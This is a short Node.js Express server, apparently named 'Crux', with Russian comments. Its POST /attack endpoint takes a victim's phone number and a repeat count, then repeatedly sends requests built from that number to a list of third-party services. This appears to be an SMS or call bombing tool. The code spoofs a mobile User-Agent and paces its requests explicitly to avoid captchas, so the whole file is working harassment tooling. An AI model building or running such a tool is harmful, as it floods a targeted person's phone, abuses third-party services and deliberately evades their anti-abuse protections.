const express = require('express');
const cors = require('cors');
const axios = require('axios');
const services = require('./services');

const app = express();
app.use(cors());
app.use(express.json());

app.post('/attack', async (req, res) => {
    const { phone, repeats } = req.body;
    const count = parseInt(repeats) || 1;

    console.log(`🚀 СТАРТ: ${phone} | Кругов: ${count}`);
    res.status(200).json({ status: "started" });

    for (let i = 0; i < count; i++) {
        console.log(`--- Круг ${i + 1} ---`);
        for (const service of services) {
            try {
                const payload = typeof service.data === 'function' ? service.data(phone) : service.data;
                
                await axios({
                    method: service.method,
                    url: service.url,
                    headers: {
                        ...service.headers,
                        // Маскируемся под мобильное устройство
                        "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 14_8 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Mobile/15E148 Safari/604.1",
                        "Accept": "*/*"
                    },
                    data: payload,
                    timeout: 5000
                });
                console.log(`✅ ${service.name}: OK`);
            } catch (e) {
                console.log(`❌ ${service.name}: Пропуск`);
            }
            // Маленькая пауза между сервисами, чтобы не ловить капчу
            await new Promise(r => setTimeout(r, 400));
        }
        // Пауза между кругами
        await new Promise(r => setTimeout(r, 2000));
    }
});

const PORT = process.env.PORT || 10000;
app.listen(PORT, '0.0.0.0', () => {
    console.log(`Сервер Crux ONLINE на порту ${PORT}`);
});
